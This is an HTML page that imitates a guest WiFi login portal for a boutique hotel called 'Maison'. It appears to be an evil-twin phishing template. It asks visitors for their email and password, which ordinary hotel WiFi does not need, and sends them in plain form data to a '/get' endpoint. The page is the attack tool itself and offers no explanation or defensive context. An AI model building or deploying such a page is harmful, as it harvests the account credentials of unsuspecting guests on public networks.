<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Hotel Maison — WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f7f4ef;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:2px;overflow:hidden;box-shadow:0 4px 40px rgba(0,0,0,0.08),0 1px 3px rgba(0,0,0,0.05)}
.stripe{height:4px;background:linear-gradient(90deg,#2C3E50,#4a6080)}
.top{padding:34px 32px 26px;text-align:center;border-bottom:1px solid #f0ece6}
.hotel-name{font-size:20px;font-weight:700;color:#2C3E50;letter-spacing:3px;text-transform:uppercase}
.hotel-type{font-size:10px;color:#aaa;letter-spacing:2px;text-transform:uppercase;margin-top:6px}
.badge{display:inline-flex;align-items:center;gap:6px;background:#f0f4f8;border-radius:20px;padding:5px 14px;margin-top:14px}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.badge span{font-size:11px;color:#6a7a8a;font-weight:500}
.body{padding:28px 32px 24px}
h3{font-size:16px;font-weight:600;color:#2C3E50;margin-bottom:4px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:22px}
.lbl{display:block;font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:6px;margin-top:16px}
input{width:100%;padding:11px 14px;border:1.5px solid #e8e4de;border-radius:4px;font-size:14.5px;background:#fdfcfa;color:#2C3E50}
input:focus{outline:none;border-color:#2C3E50;box-shadow:0 0 0 3px rgba(44,62,80,0.06)}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:4px;background:#2C3E50;color:#fff;font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer}
.btn:active{opacity:0.9}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:14px;line-height:1.6}
.terms a{color:#2C3E50}
.foot{background:#fdfcfa;border-top:1px solid #f0ece6;padding:12px 32px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#ccc;text-decoration:none}
.foot a{color:#2C3E50}
</style>
</head>
<body>
<div class="card">
  <div class="stripe"></div>
  <div class="top">
    <div class="hotel-name">Maison</div>
    <div class="hotel-type">Boutique Hotel &amp; Suites</div>
    <div class="badge"><div class="dot"></div><span>Maison-GuestWiFi</span></div>
  </div>
  <div class="body">
    <h3>Welcome Back</h3>
    <p class="sub">Enter your credentials to access our guest network.</p>
    <form action="/get">
      <label class="lbl">Email</label>
      <input name="email" type="text" placeholder="your@email.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Guest Internet Policy</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Hotel Maison</span><a href="#">Front Desk</a></div>
</div>
</body>
</html>
